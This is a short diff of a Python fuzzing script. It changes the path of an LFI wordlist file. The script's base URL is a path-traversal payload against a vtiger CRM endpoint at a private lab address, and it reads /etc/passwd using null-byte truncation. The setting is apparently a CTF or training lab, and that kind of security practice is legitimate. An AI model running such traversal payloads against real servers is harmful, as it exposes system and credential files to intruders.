@@ -6,7 +6,7 @@ start_time = time.time()
 
 base_url = 'https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../etc/passwd%00'
 
-fuzz_file = 'lfijhaddix.txt'
+fuzz_file = '/payloads/lfijhaddix.txt'
 
 with open(fuzz_file, 'r') as f:
     f = f.readlines()
